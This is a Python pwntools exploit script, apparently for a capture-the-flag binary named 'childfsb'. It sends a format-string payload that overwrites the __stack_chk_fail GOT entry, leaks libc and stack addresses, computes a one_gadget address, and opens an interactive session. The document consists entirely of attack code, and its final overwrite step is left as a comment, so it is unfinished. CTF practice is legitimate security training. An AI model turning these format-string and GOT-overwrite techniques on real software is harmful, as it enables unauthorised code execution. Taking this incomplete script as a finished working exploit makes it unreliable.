#!/usr/bin/python 
from pwn import *
import subprocess

context.log_level = 'debug'
#p = remote("ctf.j0n9hyun.xyz", 3037)
p = process("./childfsb")
elf = ELF("./childfsb")
libc = ELF("./libc.so.6")
one_gadget_off = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
main = elf.symbols['main']

gdb.attach(p)
pay = '%{}c'.format(main & 0xFFFF)
pay += '%11$p'
pay += '%13$p'
pay += '%25$hn'
#pay += 'A'*(8 - len(pay)%8)
pay += p64(elf.got['__stack_chk_fail'])
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)

# libc leak
p.recvuntil("0x")
leak = int('0x' + p.recv(12), 16)
log.info("__libc_start_main+240 : "+hex(leak))
libcBase = leak - libc.sym['__libc_start_main'] - 240
log.info("libcBase : "+hex(libcBase))
one_gadget = libcBase + one_gadget_off[0]

#printf_ret
p.recvuntil("0x")
leak2 = int('0x' + p.recv(12), 16)
log.info("leak2 : "+hex(leak2))
printf_ret = leak2 - 0x110
log.info("printf_ret : "+hex(printf_ret))

# printf_ret -> one gadget

p.interactive()

